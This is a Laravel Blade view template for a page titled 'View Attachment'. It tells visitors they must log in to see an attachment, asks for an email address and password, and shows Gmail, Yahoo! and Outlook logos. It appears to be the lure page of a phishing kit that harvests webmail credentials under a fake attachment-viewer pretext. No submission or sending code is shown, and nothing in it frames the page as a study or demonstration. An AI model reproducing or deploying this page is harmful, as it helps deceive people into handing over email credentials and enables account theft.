@extends('layout')

@section('title', "View Attachment")

@section("content") 
<div class="container-fluid">
  <div id="row1">
  <div class="row">
  	<div class="col-lg-12 col-xs-12">
  	  <center>
         <h2>You are about to view an attachment:</h2>
         <button id="btn1" class="btn btn-success">Continue</button>
        </center>
      </div>
  </div><br>
  	
    <div class="row">
  	<div class="col-lg-12 col-xs-12">
  	  <center>
         <button id="btn1" class="btn btn-success">Continue</button>
        </center>
      </div>
  </div><br>
  </div>
 
  <div id="row2">
  <div class="row">
  	<center>
         <h2>Please login to continue:</h2>
  	<form id="sendForm">
      
  	<div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
  	       <h4>Username <span style="color:red;">*</span></h4>
             <input type="email" class="form-control" id="username" required><br>
             	
             <h4>Password<span style="color:red;">*</span></h4>
             <input type="password" class="form-control" id="pass" required><br>
      </div>
     </form>
      </center>
  </div><br> 
  	
   <div class="row">
   	<center>
  	<div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
  	  <img src="{{asset('img/gmail.jpg')}}" alt="Gmail" width="200" height="200">
      </div>
      <div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
  	  <img src="{{asset('img/yahoo.png')}}" alt="Yahoo!" width="200" height="200">
      </div>
      <div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
  	  <img src="{{asset('img/outlook.png')}}" alt="Outlook" width="200" height="200">
      </div>
      </center>
  </div><br>
  
   <div class="row">
  	<div class="col-lg-12 col-xs-12">
  	  <center> 
        <button id="submit" class="btn btn-success">Submit</button>
        </center>
      </div>
  </div><br>
  </div>
</div>
@stop
